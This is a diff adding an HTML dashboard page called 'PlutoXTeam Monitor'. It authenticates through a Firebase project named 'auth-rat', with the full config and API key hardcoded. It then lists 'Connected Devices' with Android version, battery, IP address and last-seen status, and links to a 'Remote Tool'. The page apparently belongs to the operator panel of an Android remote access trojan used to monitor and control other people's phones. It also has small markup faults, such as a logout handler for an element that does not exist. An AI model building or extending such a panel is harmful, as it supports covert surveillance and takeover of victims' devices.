@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PlutoXTeam Monitor</title>
+
+    <link rel="stylesheet" href="css/style.css">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"
+        rel="stylesheet">
+
+    <!-- FIREBASE -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script src="js/theme.js"></script>
+
+    <!-- FIREBASE AUTH INIT + GUARD -->
+    <script>
+        firebase.initializeApp({
+            apiKey: "AIzaSyCg5jaxHtALGbHssWD6sk7EklZsj3EFSLk",
+            authDomain: "auth-rat.firebaseapp.com",
+            projectId: "auth-rat",
+            storageBucket: "auth-rat.appspot.com",
+            messagingSenderId: "211012554206",
+            appId: "1:211012554206:web:f0697a1b9289659754a14f"
+        });
+
+        const auth = firebase.auth();
+
+        auth.onAuthStateChanged(user => {
+            if (!user) {
+                location.replace("login.html");
+            }
+        });
+    </script>
+</head>
+
+<body>
+
+    <div class="layout">
+        <div class="sidebar-overlay"></div>
+
+        <aside class="sidebar">
+            <a href="index.html" class="brand">
+                <img src="img/logo.jpg" alt="PlutoXTeam"
+                    style="height:32px;width:32px;border-radius:6px;object-fit:cover;">
+                PlutoXTeam
+            </a>
+
+            <div class="nav-title">Main</div>
+
+            <a href="index.html" class="nav-link active">
+                <!-- ICON TETAP -->
+                All Devices
+            </a>
+
+            <a href="#" id="link-dashboard" class="nav-link">Dashboard</a>
+            <a href="remote.html" id="link-remote" class="nav-link">Remote Tool</a>
+        </aside>
+
+        <main class="content">
+
+            <div class="mobile-header">
+                <button class="mobile-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M4 6h16M4 12h16M4 18h16" />
+                    </svg>
+                </button>
+
+                <div class="mobile-brand">
+                    <img src="img/logo.jpg" alt="PlutoXTeam"
+                        style="height:28px;width:28px;border-radius:4px;object-fit:cover;">
+                    PlutoXTeam
+                </div>
+                </button>
+            </div>
+
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem;">
+                <h1>Dashboard</h1>
+
+                <!-- LOGOUT DESKTOP -->
+                <button id="logoutBtn"
+                    style="background:#ef4444;color:white;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;">
+                    Logout
+                </button>
+            </div>
+
+            <div id="connection-status" class="status-badge">Connecting...</div>
+
+            <!-- SEMUA FITUR ASLI DI BAWAH INI TIDAK DIUBAH -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="total-devices">0</div>
+                    <div class="stat-label">Total Devices</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="online-devices">0</div>
+                    <div class="stat-label">Online</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="offline-devices">0</div>
+                    <div class="stat-label">Offline</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>Connected Devices</h2>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Status</th>
+                                <th>Device Name</th>
+                                <th>Android Ver</th>
+                                <th>Battery</th>
+                                <th>IP Address</th>
+                                <th>Last Seen</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="devices-table-body">
+                            <tr>
+                                <td colspan="7" style="text-align:center;">Loading devices...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <div class="footer">Powered by PlutoXTeam</div>
+
+    <!-- SCRIPT ASLI (TIDAK DIHAPUS) -->
+    <script src="js/firebase_config.js"></script>
+    <script src="js/ui.js"></script>
+    <script src="js/app.js"></script>
+
+    <!-- LOGOUT -->
+    <script>
+        function doLogout() {
+            auth.signOut().then(() => location.replace("login.html"));
+        }
+
+        document.getElementById("logoutBtn").onclick = doLogout;
+        document.getElementById("logoutBtnMobile").onclick = doLogout;
+    </script>
+
+</body>
+</html>
